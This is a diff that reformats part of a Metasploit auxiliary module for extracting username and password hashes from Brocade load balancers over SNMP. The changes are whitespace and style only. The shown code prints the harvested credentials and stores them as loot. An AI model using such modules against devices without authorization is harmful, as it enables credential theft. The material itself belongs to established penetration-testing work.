@@ -10,19 +10,17 @@ class MetasploitModule < Msf::Auxiliary
 
   def initialize
     super(
-      'Name'        => 'Brocade Password Hash Enumeration',
+      'Name' => 'Brocade Password Hash Enumeration',
       'Description' => %q{
         This module extracts password hashes from certain Brocade load
         balancer devices.
       },
-      'References'  =>
-        [
-          [ 'URL', 'https://blog.rapid7.com/2014/05/15/r7-2014-01-r7-2014-02-r7-2014-03-disclosures-exposure-of-critical-information-via-snmp-public-community-string' ]
-        ],
-      'Author'      => ['Deral "PercentX" Heiland'],
-      'License'     => MSF_LICENSE
+      'References' => [
+        [ 'URL', 'https://blog.rapid7.com/2014/05/15/r7-2014-01-r7-2014-02-r7-2014-03-disclosures-exposure-of-critical-information-via-snmp-public-community-string' ]
+      ],
+      'Author' => ['Deral "PercentX" Heiland'],
+      'License' => MSF_LICENSE
     )
-
   end
 
   def run_host(ip)
@@ -42,30 +40,29 @@ class MetasploitModule < Msf::Auxiliary
         end
 
         print_good("#{ip} - Found user and password hashes:")
-        end
+      end
 
-        credinfo = ""
-        @users.each_index do |i|
+      credinfo = ""
+      @users.each_index do |i|
         credinfo << "#{@users[i]}:#{@hashes[i]}" << "\n"
         print_good("#{@users[i]}:#{@hashes[i]}")
-        end
+      end
 
+      # Woot we got loot.
+      loot_name = "brocade.hashes"
+      loot_type = "text/plain"
+      loot_filename = "brocade_hashes.txt"
+      loot_desc = "Brodace username and password hashes"
+      p = store_loot(loot_name, loot_type, datastore['RHOST'], credinfo, loot_filename, loot_desc)
 
-     #Woot we got loot.
-     loot_name     = "brocade.hashes"
-     loot_type     = "text/plain"
-     loot_filename = "brocade_hashes.txt"
-     loot_desc     = "Brodace username and password hashes"
-     p = store_loot(loot_name, loot_type, datastore['RHOST'], credinfo , loot_filename, loot_desc)
-
-     print_status("Credentials saved: #{p}")
-     rescue ::SNMP::UnsupportedVersion
-     rescue ::SNMP::RequestTimeout
-     rescue ::Interrupt
-       raise $!
-     rescue ::Exception => e
-       print_error("#{ip} - Error: #{e.class} #{e}")
-     disconnect_snmp
-     end
+      print_status("Credentials saved: #{p}")
+    rescue ::SNMP::UnsupportedVersion
+    rescue ::SNMP::RequestTimeout
+    rescue ::Interrupt
+      raise $!
+    rescue ::Exception => e
+      print_error("#{ip} - Error: #{e.class} #{e}")
+      disconnect_snmp
+    end
   end
 end
